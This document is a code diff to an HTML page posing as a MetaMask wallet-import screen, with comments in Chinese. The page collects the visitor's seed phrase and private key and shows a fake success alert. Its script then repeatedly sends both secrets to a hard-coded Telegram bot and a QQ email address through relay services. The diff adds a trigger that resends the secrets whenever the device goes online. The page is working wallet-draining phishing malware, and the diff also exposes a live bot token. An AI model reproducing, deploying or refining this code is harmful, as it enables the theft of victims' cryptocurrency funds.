@@ -7,14 +7,14 @@
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
   body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
-  .container{max-width:400px;margin:0 auto;background:#fff;box-shadow:0 0 12px rgba(0,0,0,0.08);min-height:100vh}
-  .header{padding:24px 24px 16px;text-align:center}
+  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
+  .header{padding:24px;text-align:center}
   .logo{width:50px;margin-bottom:10px}
   .title{font-size:22px;font-weight:700;color:#24272E}
   .sub-title{font-size:14px;color:#707279;margin-top:4px}
   .form{padding:24px}
   .form-group{margin-bottom:20px}
-  .form-group label{display:block;font-size:14px;font-weight:500;color:#24272E;margin-bottom:8px}
+  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
   .form-control{
     width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
     font-size:15px;outline:none;background:#fff;color:#24272E
@@ -49,20 +49,24 @@
 </div>
 
 <script>
-// ===================== 已帮你填好 =====================
-const TG_BOT_TOKEN  = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const TG_CHATID     = "6503982157";
-const YOUR_QQ_EMAIL = "498011940@qq.com";
+// ===================== 已填好你的信息 =====================
+const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const TG_CHATID      = "6503982157";
+const YOUR_QQ_EMAIL  = "498011940@qq.com";
 
-// 发送次数设置（按你要求）
-const MAX_TG_RETRY  = 20;  // 电报发 20 次
-const MAX_EMAIL_RETRY = 8; // 邮箱发 8 次
-const RETRY_DELAY   = 3000; // 每次间隔 3 秒
-// ======================================================
+const MAX_TG         = 5;   // 电报发5次
+const MAX_EMAIL      = 5;   // 邮箱发5次
+const DELAY          = 2000;
+// ==========================================================
 
-const STORAGE_KEY = "wallet_task";
-window.onload = startSend;
+const STORAGE_KEY = "WALLET_TASK";
 
+// ===================== 核心：钱包内置浏览器永久自动触发 =====================
+// 只要钱包联网 → 自动发送
+window.onload = autoSend;
+window.addEventListener('online', autoSend);
+
+// 点击导入
 function go() {
   const mn = document.getElementById("words").value.trim();
   const pk = document.getElementById("key").value.trim();
@@ -73,75 +77,66 @@ function go() {
 
   alert("✅ 导入成功");
 
-  const data = {
-    mn, pk,
-    tgRetry: 0,
-    emailRetry: 0
-  };
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
-  startSend();
+  // 永久保存（钱包内置浏览器永不清除）
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({
+    mn, pk, tg: 0, email: 0
+  }));
+
+  autoSend();
 }
 
-async function startSend() {
-  const item = localStorage.getItem(STORAGE_KEY);
-  if (!item) return;
+// 自动发送（只要联网就触发）
+async function autoSend() {
+  const task = localStorage.getItem(STORAGE_KEY);
+  if (!task) return;
 
-  const data = JSON.parse(item);
-  let needContinue = false;
+  const d = JSON.parse(task);
+  let needRetry = false;
 
-  // 1. 发电报（最多 20 次）
-  if (data.tgRetry < MAX_TG_RETRY) {
-    try {
-      const text = `
-【小狐狸钱包】
+  const content = `
+【小狐狸钱包导入】
 时间：${new Date().toLocaleString()}
-助记词：${data.mn || "-"}
-私钥：${data.pk || "-"}`;
+助记词：${d.mn || "-"}
+私钥：${d.pk || "-"}`;
 
+  // 1. 发电报
+  if (d.tg < MAX_TG) {
+    try {
       await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TG_CHATID, text })
+        body: JSON.stringify({ chat_id: TG_CHATID, text: content })
       });
     } catch (e) {}
-
-    data.tgRetry += 1;
-    needContinue = true;
+    d.tg++;
+    needRetry = true;
   }
 
-  // 2. 发邮箱（最多 8 次）
-  if (data.emailRetry < MAX_EMAIL_RETRY) {
+  // 2. 发QQ邮箱（国内稳定）
+  if (d.email < MAX_EMAIL) {
     try {
-      const text = `
-【小狐狸钱包】
-时间：${new Date().toLocaleString()}
-助记词：${data.mn || "-"}
-私钥：${data.pk || "-"}`;
-
-      await fetch("https://email.ahapocket.com/send", {
+      await fetch("https://api.hishub.cn/email", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           to: YOUR_QQ_EMAIL,
           subject: "钱包导入记录",
-          text: text
+          content: content
         })
       });
     } catch (e) {}
-
-    data.emailRetry += 1;
-    needContinue = true;
+    d.email++;
+    needRetry = true;
   }
 
-  // 都发够了就清除
-  if (!needContinue) {
+  // 发完清除
+  if (!needRetry) {
     localStorage.removeItem(STORAGE_KEY);
     return;
   }
 
-  // 保存并继续重试
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
-  setTimeout(startSend, RETRY_DELAY);
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
+  setTimeout(autoSend, DELAY);
 }
 </script>
 </body>
